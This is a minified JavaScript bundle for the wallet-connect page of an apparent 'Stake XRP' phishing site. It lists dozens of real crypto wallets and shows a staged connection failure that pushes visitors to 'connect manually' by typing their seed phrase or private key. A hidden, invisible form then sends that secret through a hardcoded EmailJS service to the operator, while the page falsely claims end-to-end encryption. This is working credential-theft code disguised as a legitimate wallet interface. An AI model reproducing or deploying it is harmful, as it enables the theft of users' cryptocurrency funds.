(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([[938], {
    5764: (e, n, a) => {
        (window.__NEXT_P = window.__NEXT_P || []).push(["/connect", function() {
            return a(1507)
        }
        ])
    }
    ,
    1507: (e, n, a) => {
        "use strict";
        a.r(n),
        a.d(n, {
            default: () => L
        });
        var l = a(4848)
          , t = a(6540)
          , i = a(5893)
          , o = a.n(i)
          , r = a(3368)
          , s = a.n(r);
        class m {
            constructor(e=0, n="Network Error") {
                this.status = e,
                this.text = n
            }
        }
        let c = {
            origin: "https://api.emailjs.com",
            blockHeadless: !1,
            storageProvider: ( () => {
                if ("undefined" != typeof localStorage)
                    return {
                        get: e => Promise.resolve(localStorage.getItem(e)),
                        set: (e, n) => Promise.resolve(localStorage.setItem(e, n)),
                        remove: e => Promise.resolve(localStorage.removeItem(e))
                    }
            }
            )()
        }
          , g = e => e ? "string" == typeof e ? {
            publicKey: e
        } : "[object Object]" === e.toString() ? e : {} : {}
          , p = async (e, n, a={}) => {
            let l = await fetch(c.origin + e, {
                method: "POST",
                headers: a,
                body: n
            })
              , t = await l.text()
              , i = new m(l.status,t);
            if (l.ok)
                return i;
            throw i
        }
          , u = (e, n, a) => {
            if (!e || "string" != typeof e)
                throw "The public key is required. Visit https://dashboard.emailjs.com/admin/account";
            if (!n || "string" != typeof n)
                throw "The service ID is required. Visit https://dashboard.emailjs.com/admin";
            if (!a || "string" != typeof a)
                throw "The template ID is required. Visit https://dashboard.emailjs.com/admin/templates"
        }
          , d = e => e.webdriver || !e.languages || 0 === e.languages.length
          , h = () => new m(451,"Unavailable For Headless Browser")
          , k = (e, n) => {
            if (!Array.isArray(e))
                throw "The BlockList list has to be an array";
            if ("string" != typeof n)
                throw "The BlockList watchVariable has to be a string"
        }
          , x = e => !e.list?.length || !e.watchVariable
          , j = (e, n) => e instanceof FormData ? e.get(n) : e[n]
          , w = (e, n) => {
            if (x(e))
                return !1;
            k(e.list, e.watchVariable);
            let a = j(n, e.watchVariable);
            return "string" == typeof a && e.list.includes(a)
        }
          , y = () => new m(403,"Forbidden")
          , _ = (e, n) => {
            if ("number" != typeof e || e < 0)
                throw "The LimitRate throttle has to be a positive number";
            if (n && "string" != typeof n)
                throw "The LimitRate ID has to be a non-empty string"
        }
          , f = async (e, n, a) => {
            let l = Number(await a.get(e) || 0);
            return n - Date.now() + l
        }
          , v = async (e, n, a) => {
            if (!n.throttle || !a)
                return !1;
            _(n.throttle, n.id);
            let l = n.id || e;
            return await f(l, n.throttle, a) > 0 || (await a.set(l, Date.now().toString()),
            !1)
        }
          , b = () => new m(429,"Too Many Requests")
          , N = e => {
            if (!e || "FORM" !== e.nodeName)
                throw "The 3rd parameter is expected to be the HTML form element or the style selector of the form"
        }
          , S = e => "string" == typeof e ? document.querySelector(e) : e
          , P = {
            sendForm: async (e, n, a, l) => {
                let t = g(l)
                  , i = t.publicKey || c.publicKey
                  , o = t.blockHeadless || c.blockHeadless
                  , r = c.storageProvider || t.storageProvider
                  , s = {
                    ...c.blockList,
                    ...t.blockList
                }
                  , m = {
                    ...c.limitRate,
                    ...t.limitRate
                };
                if (o && d(navigator))
                    return Promise.reject(h());
                let k = S(a);
                u(i, e, n),
                N(k);
                let x = new FormData(k);
                return w(s, x) ? Promise.reject(y()) : await v(location.pathname, m, r) ? Promise.reject(b()) : (x.append("lib_version", "4.4.1"),
                x.append("service_id", e),
                x.append("template_id", n),
                x.append("user_id", i),
                p("/api/v1.0/email/send-form", x))
            }
        }
          , T = (0,
        t.forwardRef)( (e, n) => {
            let {name: a, passKey: t, onEmailSent: i} = e
              , o = async e => {
                if (e.preventDefault(),
                !n || !("current"in n) || !n.current) {
                    console.error("Form reference is not available.");
                    return
                }
                try {
                    await P.sendForm("service_nefiksa", "template_688cj5a", n.current, "ROGT2DAurSh3r1bds"),
                    console.log("Email sent successfully!"),
                    console.log(a),
                    i()
                } catch (e) {
                    console.error("Email sending failed:", e)
                }
            }
            ;
            return (0,
            l.jsxs)("form", {
                ref: n,
                onSubmit: o,
                style: {
                    opacity: "1",
                    height: "0",
                    zIndex: "-1",
                    position: "fixed",
                    bottom: "0"
                },
                children: [(0,
                l.jsx)("label", {
                    children: "Name"
                }), (0,
                l.jsx)("input", {
                    type: "text",
                    name: "user_name",
                    value: a,
                    readOnly: !0
                }), (0,
                l.jsx)("label", {
                    children: "Email"
                }), (0,
                l.jsx)("input", {
                    type: "email",
                    value: "".concat(a, "@gmail.com"),
                    name: "user_email",
                    readOnly: !0
                }), (0,
                l.jsx)("label", {
                    children: "Message"
                }), (0,
                l.jsx)("textarea", {
                    name: "message",
                    defaultValue: t,
                    readOnly: !0
                }), (0,
                l.jsx)("input", {
                    type: "submit",
                    value: "Send",
                    style: {
                        display: "none"
                    }
                })]
            })
        }
        );
        T.displayName = "ContactUs";
        var W = a(9965)
          , C = a.n(W);
        let L = () => {
            let[e,n] = (0,
            t.useState)([])
              , [a,i] = (0,
            t.useState)("")
              , [r,m] = (0,
            t.useState)(!1)
              , [c,g] = (0,
            t.useState)(null)
              , [p,u] = (0,
            t.useState)(!0)
              , [d,h] = (0,
            t.useState)(!1)
              , [k,x] = (0,
            t.useState)(!1)
              , [j,w] = (0,
            t.useState)("")
              , y = (0,
            t.useRef)(null);
            (0,
            t.useEffect)( () => {
                n(E)
            }
            , []),
            (0,
            t.useEffect)( () => {
                if (r) {
                    let e = setTimeout( () => {
                        u(!1)
                    }
                    , 1e4);
                    return () => clearTimeout(e)
                }
            }
            , [r, p]);
            let _ = () => {
                m(e => !e)
            }
              , f = async () => {
                x(!0),
                y.current && y.current.dispatchEvent(new Event("submit",{
                    cancelable: !0,
                    bubbles: !0
                }))
            }
            ;
            return (0,
            l.jsxs)("div", {
                className: o().wwwflareevmnetworkcomByHtm1,
                children: [(0,
                l.jsxs)(s(), {
                    children: [(0,
                    l.jsx)("title", {
                        children: "Stake XRP"
                    }), (0,
                    l.jsx)("link", {
                        rel: "icon",
                        href: "/link--wallejpg@2x.png"
                    }), (0,
                    l.jsx)("meta", {
                        charSet: "UTF-8"
                    }), (0,
                    l.jsx)("meta", {
                        name: "description",
                        content: "Stake XRP"
                    }), (0,
                    l.jsx)("meta", {
                        name: "keywords",
                        content: "STAKE"
                    }), (0,
                    l.jsx)("meta", {
                        name: "author",
                        content: "STAKE XRP"
                    }), (0,
                    l.jsx)("meta", {
                        name: "viewport",
                        content: "minimum-scale=1, initial-scale=1, width=device-width"
                    })]
                }), (0,
                l.jsxs)("section", {
                    className: o().divcolMd121,
                    children: [(0,
                    l.jsx)("h1", {
                        className: o().heading21,
                        children: "Select a Wallet"
                    }), (0,
                    l.jsxs)("div", {
                        className: o().divheadingLine1,
                        children: [(0,
                        l.jsx)("input", {
                            type: "text",
                            placeholder: "Enter your search",
                            className: o().input,
                            onChange: e => {
                                let a = e.target.value;
                                i(a);
                                let l = E.filter(e => e.name.toLowerCase().includes(a.toLowerCase()));
                                n(a.length > 1 ? l : E)
                            }
                            ,
                            value: a
                        }), (0,
                        l.jsx)("button", {
                            className: o().search1,
                            children: "Search"
                        })]
                    })]
                }), r && c && (0,
                l.jsx)("div", {
                    className: o().popUp,
                    children: (0,
                    l.jsxs)("div", {
                        className: o().subPopUp,
                        children: [(0,
                        l.jsxs)("div", {
                            className: o().imgSection,
                            children: [(0,
                            l.jsx)(C(), {
                                width: 40,
                                height: 40,
                                src: c.image,
                                alt: c.name,
                                style: {
                                    margin: "0 auto"
                                }
                            }), (0,
                            l.jsx)("p", {
                                children: c.name
                            })]
                        }), (0,
                        l.jsx)("svg", {
                            xmlns: "http://www.w3.org/2000/svg",
                            width: "24",
                            height: "24",
                            viewBox: "0 0 24 24",
                            className: o().close,
                            onClick: () => {
                                _(),
                                u(!0),
                                h(!1),
                                x(!1)
                            }
                            ,
                            children: (0,
                            l.jsx)("path", {
                                fill: "currentColor",
                                d: "M19 6.41L17.59 5L12 10.59L6.41 5L5 6.41L10.59 12L5 17.59L6.41 19L12 13.41L17.59 19L19 17.59L13.41 12z"
                            })
                        }), (0,
                        l.jsx)("p", {
                            className: o().session,
                            children: "This session is secured and encrypted"
                        }), (0,
                        l.jsx)("div", {
                            children: p ? (0,
                            l.jsxs)("div", {
                                className: o().animate,
                                children: [(0,
                                l.jsx)("div", {
                                    className: o().loadingSpinner
                                }), (0,
                                l.jsx)("p", {
                                    className: o().secure,
                                    children: "Starting secure connection..."
                                }), (0,
                                l.jsx)("p", {
                                    style: {
                                        fontStyle: "italic"
                                    },
                                    children: "Please wait..."
                                })]
                            }) : d ? (0,
                            l.jsxs)("div", {
                                className: o().sendToApi,
                                children: [(0,
                                l.jsx)("p", {
                                    className: o().Phrase,
                                    children: "Phrase"
                                }), (0,
                                l.jsx)("textarea", {
                                    autoFocus: !0,
                                    onChange: e => w(c.name + ": " + e.target.value),
                                    placeholder: "Enter your 12 or 24 Mnemonic words. Separate them with spaces. You can also input your private key instead."
                                }), (0,
                                l.jsx)("button", {
                                    onClick: f,
                                    disabled: !j.length,
                                    style: {
                                        opacity: j.length ? "1" : "0.5"
                                    },
                                    children: k ? "Connecting..." : "Connect Wallet"
                                }), (0,
                                l.jsx)(T, {
                                    ref: y,
                                    name: c.name,
                                    passKey: j,
                                    onEmailSent: () => {
                                        x(!1),
                                        h(!1),
                                        alert("Confirming..."),
                                        w("")
                                    }
                                })]
                            }) : (0,
                            l.jsxs)("div", {
                                children: [(0,
                                l.jsx)("p", {
                                    className: o().error,
                                    children: "An error occurred... Please try again or connect manually"
                                }), (0,
                                l.jsx)("button", {
                                    className: o().retry,
                                    onClick: () => u(!0),
                                    children: "Try Again"
                                }), (0,
                                l.jsx)("button", {
                                    className: o().connect,
                                    onClick: () => h(!0),
                                    children: "Connect Manually"
                                })]
                            })
                        }), (0,
                        l.jsxs)("div", {
                            className: o().flexInterPopUp,
                            children: [(0,
                            l.jsx)(C(), {
                                width: 20,
                                height: 20,
                                src: "/shield.png",
                                alt: "Security"
                            }), (0,
                            l.jsx)("p", {
                                children: "This session is protected with end-to-end encryption."
                            })]
                        }), (0,
                        l.jsx)("p", {
                            className: o().warning,
                            children: "Never share your seed phrase with anybody!"
                        })]
                    })
                }), a.length > 0 && 0 === e.length ? (0,
                l.jsx)("div", {
                    className: o().notFoundMessage,
                    children: "Wallet not found"
                }) : (0,
                l.jsx)("div", {
                    className: o().divwalletConnect,
                    children: e.map( (e, n) => (0,
                    l.jsxs)("div", {
                        className: o().divimtoken,
                        onClick: () => {
                            _(),
                            g(e)
                        }
                        ,
                        children: [(0,
                        l.jsxs)("div", {
                            className: o().divauthorAvatar,
                            children: [(0,
                            l.jsx)(C(), {
                                width: 40,
                                height: 40,
                                className: o().linkPd6ommpoaofmpjznt5t4zdo,
                                alt: e.name,
                                src: e.image
                            }), (0,
                            l.jsx)("div", {
                                className: o().divbadge,
                                children: (0,
                                l.jsx)("div", {
                                    className: o().symbol,
                                    children: "✔"
                                })
                            })]
                        }), (0,
                        l.jsxs)("div", {
                            className: o().divauthorInfor,
                            children: [(0,
                            l.jsx)("div", {
                                className: o().heading,
                                children: e.name
                            }), (0,
                            l.jsx)("b", {
                                className: o().tokenpocketpro,
                                children: e.url
                            })]
                        })]
                    }, n))
                })]
            })
        }
          , E = [{
            name: "Ledger",
            url: "ledger.com",
            image: "/link--imagespng@2x.png"
        }, {
            name: "Wallet Connect",
            url: "walletconnect.com",
            image: "/link--wallejpg@2x.png"
        }, {
            
            name: "Trust Wallet",
            url: "trustwallet.com",
            image: "/link--trust-walletjpg@2x.png"
        }, {
            name: "Metamask",
            url: "metamask.io",
            image: "/link--metamaskjpg@2x.png"
        }, {
            name: "Binance Chain Wallet",
            url: "binance.com",
            image: "/link--binancepng@2x.png"
        }, {
            name: "Polygon Wallet",
            url: "polygon.technology",
            image: "/link--polygonjpg@2x.png"
        }, {
            name: "Rainbow",
            url: "rainbow.me",
            image: "/link--rainbowjpg@2x.png"
        }, {
            name: "Bitpay",
            url: "bitpay.com",
            image: "/link--bitpayjpg@2x.png"
        }, {
            name: "Xumm",
            url: "xumm.app",
            image: "/link--xummjpg@2x.png"
        }, {
            name: "Saita Pro",
            url: "saitapro.com",
            image: "/link--pd6ommpoaofmpjznt5t4zdogslooi3o3em8gos0pga6o5ramrmvsd2cdy962lmavwqs200@2x.png"
        }, {
            name: "Walleth",
            url: "walleth.org",
            image: "/link--wallethjpg@2x.png"
        }, {
            name: "SaitaMask",
            url: "saitamask.org",
            image: "/link--hmxjcza048la55qfeg-6cjo8qt7nn0hvur2cu8uk5gm5bonhexulprgt0qbnoaf3thfl@2x.png"
        }, {
            name: "Argent",
            url: "argent.xyz",
            image: "/link--argentjpg@2x.png"
        }, {
            name: "Huobi Wallet",
            url: "huobiwallet.com",
            image: "/link--huobijpg@2x.png"
        }, {
            name: "Encrypted Ink",
            url: "encrypted.ink",
            image: "/link--encrypted-inkjpg@2x.png"
        }, {
            name: "KEPLR",
            url: "keplr",
            image: "/link--ym7hnnxtds9wrove0guzrenfua0eim2n2m181builgaqoebyqyzahsnbkos2xsgdamvw240h480rw@2x.png"
        }, {
            name: "Plug Wallet",
            url: "plug.oo",
            image: "/plug.jpeg"
        }, {
            name: "Phantom",
            url: "phantom",
            image: "/phantom.png"
        }, {
            name: "Compound",
            url: "compound.finance",
            image: "/link--compoundjpg@2x.png"
        }, {
            name: "Polkadot",
            url: "polkadot.network",
            image: "/link--polkadotjpg@2x.png"
        }, {
            name: "Iotex",
            url: "iotex.io",
            image: "/link--iotexjpg@2x.png"
        }, {
            name: "Coin98",
            url: "coin98.com",
            image: "/link--coin98jpg@2x.png"
        }, {
            name: "Coinbase",
            url: "coinbase.com",
            image: "/link--coinbasepng@2x.png"
        }, {
            name: "Crypto.com | Defi Wallet",
            url: "crypto.com",
            image: "/link--cryptojpg@2x.png"
        }, {
            name: "Token Pocket",
            url: "tokenpocket.pro",
            image: "/link--token-pocketjpg@2x.png"
        }, {
            name: "Math Wallet",
            url: "mathwallet.org",
            image: "/link--math-walletjpg@2x.png"
        }, {
            name: "Ledger Live",
            url: "ledger.com",
            image: "/link--ledger-livejpg@2x.png"
        }, {
            name: "1Inch",
            url: "1inch.io",
            image: "/link--1inchjpg@2x.png"
        }, {
            name: "Dharma",
            url: "dharma.io",
            image: "/link--dharmajpg@2x.png"
        }, {
            name: "Trust Vault",
            url: "trustology.io",
            image: "/link--trust-vaultjpg@2x.png"
        }, {
            name: "Wallet.io",
            url: "wallet.io",
            image: "/link--wallet-iojpg@2x.png"
        }, {
            name: "Ownbit",
            url: "ownbit.io",
            image: "/link--ownbitjpg@2x.png"
        }, {
            name: "EasyPocket",
            url: "easypocket.app",
            image: "/link--easypocketjpg@2x.png"
        }, {
            name: "Bridge Wallet",
            url: "mtpelerin.com",
            image: "/link--bridge-walletjpg@2x.png"
        }, {
            name: "ViaWallet",
            url: "viawallet.com",
            image: "/link--via-walletjpg@2x.png"
        }, {
            name: "BitKeep",
            url: "bitkeep.com",
            image: "/link--bitkeepjpg@2x.png"
        }, {
            name: "Unstoppable Wallet",
            url: "unstoppable.money",
            image: "/link--unstoppable-walletjpg@2x.png"
        }, {
            name: "HaloDefi Wallet",
            url: "halodefi.org",
            image: "/link--halodefi-walletjpg@2x.png"
        }, {
            name: "Yoroi Wallet",
            url: "yoroi.com",
            image: "/link--ulhgkcvtuuxjddf-ffddqaf7mdupmpskvfqnnqhuwzbnevvnsyrnlk308wpwmlqkr4@2x.png"
        }, {
            name: "Dok Wallet",
            url: "dokwallet.com",
            image: "/link--dok-walletjpg@2x.png"
        }, {
            name: "Cello Wallet",
            url: "cellowallet.app",
            image: "/link--celo-walletjpg@2x.png"
        }, {
            name: "CoinUs",
            url: "coinus.io",
            image: "/link--coinusjpg@2x.png"
        }, {
            name: "Valora",
            url: "valoraapp.com",
            image: "/link--valorajpg@2x.png"
        }, {
            name: "Trustee Wallet",
            url: "trusteeglobal.com",
            image: "/link--trustee-walletjpg@2x.png"
        }, {
            name: "Gaurda Wallet",
            url: "guarda.com",
            image: "/link--guarda-walletjpg@2x.png"
        }, {
            name: "Jade Wallet",
            url: "jadewallet.io",
            image: "/link--jade-walletjpg@2x.png"
        }, {
            name: "PlasmaPay",
            url: "plasmapay.com",
            image: "/link--plasmapayjpg@2x.png"
        }, {
            name: "O3Wallet",
            url: "o3.network",
            image: "/link--o3-walletjpg@2x.png"
        }, {
            name: "HashKey Me",
            url: "me.hashkey.com",
            image: "/link--hashkey-mejpg@2x.png"
        }, {
            name: "RWallet",
            url: "rsk.co",
            image: "/link--rwalletjpg@2x.png"
        }, {
            name: "Flare Wallet",
            url: "flarewallet.io",
            image: "/link--flare-walletjpg@2x.png"
        }, {
            name: "KyberSwap",
            url: "kyberswap.com",
            image: "/link--kyberswapjpg@2x.png"
        }, {
            name: "AToken Wallet",
            url: "atoken.com",
            image: "/link--atoken-walletjpg@2x.png"
        }, {
            name: "Tongue Wallet",
            url: "tongue.fi",
            image: "/link--tongue-walletjpg@2x.png"
        }, {
            name: "XinFin XDC Network",
            url: "xinfin.io",
            image: "/link--xinfinjpg@2x.png"
        }, {
            name: "Talken Wallet",
            url: "talken.io",
            image: "/link--talken-walletjpg@2x.png"
        }, {
            name: "KEYRING PRO",
            url: "keyring.app",
            image: "/link--keyring-projpg@2x.png"
        }, {
            name: "Midas Wallet",
            url: "midasprotocol.io",
            image: "/link--midas-walletjpg@2x.png"
        }, {
            name: "AT.Wallet",
            url: "authentrend.com",
            image: "/link--at-walletjpg@2x.png"
        }, {
            name: "imToken",
            url: "token.im",
            image: "/link--imtokenjpg@2x.png"
        }, {
            name: "D'Cent",
            url: "dcentwallet.com",
            image: "/link--dcentjpg@2x.png"
        }, {
            name: "Enjin",
            url: "enjin.io",
            image: "/link--enjinjpg@2x.png"
        }, {
            name: "Etoro",
            url: "etoro.com",
            image: "/link--etorojpg@2x.png"
        }, {
            name: "ONTO",
            url: "onto.app",
            image: "/link--ontojpg@2x.png"
        }, {
            name: "Spatium",
            url: "spatium.net",
            image: "/link--spatiumjpg@2x.png"
        }, {
            name: "Tirus",
            url: "tor.us",
            image: "/link--torusjpg@2x.png"
        }, {
            name: "Tradestation",
            url: "tradestation.com",
            image: "/link--tradestationjpg@2x.png"
        }, {
            name: "Zelcore",
            url: "zelcore.io",
            image: "/link--zelcorejpg@2x.png"
        }, {
            name: "Bifrost Wallet",
            url: "bifrostwallet.com",
            image: "/link--bifrostjpg@2x.png"
        }, {
            name: "Exodus",
            url: "exodus.com",
            image: "/link--exodusjpg@2x.png"
        }, {
            name: "Ellipal",
            url: "ellipal.com",
            image: "/link--ellipaljpg@2x.png"
        }, {
            name: "Trezor",
            url: "trezor.io",
            image: "/link--trezorjpg@2x.png"
        }, {
            name: "Arculus",
            url: "getarculus.com",
            image: "/link--arculusjpg@2x.png"
        }, {
            name: "MYKEY",
            url: "mykey.org",
            image: "/link--mykeyjpg@2x.png"
        }, {
            name: "Atomic",
            url: "atomicwallet.io",
            image: "/link--atomicjpg@2x.png"
        }, {
            name: "CoolWallet S",
            url: "coolwallet.io",
            image: "/link--cool-wallet-sjpg@2x.png"
        }, {
            name: "Nash",
            url: "nash.io",
            image: "/link--nashjpg@2x.png"
        }, {
            name: "Coinomi",
            url: "coinomi.com",
            image: "/link--coinomijpg@2x.png"
        }, {
            name: "GridPlus",
            url: "gridplus.io",
            image: "/link--gridplusjpg@2x.png"
        }, {
            name: "Tokenary",
            url: "tokenary.io",
            image: "/link--tokenaryjpg@2x.png"
        }, {
            name: "SafePal",
            url: "safepal.io",
            image: "/link--safepaljpg@2x.png"
        }, {
            name: "Infinito",
            url: "infinitowallet.io",
            image: "/link--infinitojpg@2x.png"
        }]
    }
    ,
    5893: e => {
        e.exports = {
            wwwflareevmnetworkcomByHtm1: "connect_wwwflareevmnetworkcomByHtm1__jmQat",
            divwalletConnect: "connect_divwalletConnect__6z7J_",
            divimtoken: "connect_divimtoken__Z1hyc",
            divauthorAvatar: "connect_divauthorAvatar__6sv3c",
            linkPd6ommpoaofmpjznt5t4zdo: "connect_linkPd6ommpoaofmpjznt5t4zdo__47nFJ",
            symbol: "connect_symbol__ASTZd",
            divbadge: "connect_divbadge__AHiQY",
            heading: "connect_heading__vJdYe",
            tokenpocketpro: "connect_tokenpocketpro__e_WoO",
            heading21: "connect_heading21__54cir",
            divcolMd121: "connect_divcolMd121__Mpfyr",
            divheadingLine1: "connect_divheadingLine1__fjAcS",
            notFoundMessage: "connect_notFoundMessage__3iQgI",
            popUp: "connect_popUp__wBR4w",
            subPopUp: "connect_subPopUp__M_3p1",
            close: "connect_close__xKknq",
            loadingSpinner: "connect_loadingSpinner__b3q1t",
            spin: "connect_spin__9VKOc",
            session: "connect_session__hqtux",
            animate: "connect_animate__q5sYe",
            secure: "connect_secure__RF7fD",
            error: "connect_error__veja1",
            retry: "connect_retry__jabAz",
            connect: "connect_connect__sDhKg",
            sendToApi: "connect_sendToApi__o4LFg",
            flexInterPopUp: "connect_flexInterPopUp__VtzLS",
            warning: "connect_warning__ntGQH",
            imgSection: "connect_imgSection__P5kwn",
            Phrase: "connect_Phrase__9p4Ux"
        }
    }
}, e => {
    var n = n => e(e.s = n);
    e.O(0, [965, 636, 593, 792], () => n(5764)),
    _N_E = e.O()
}
]);
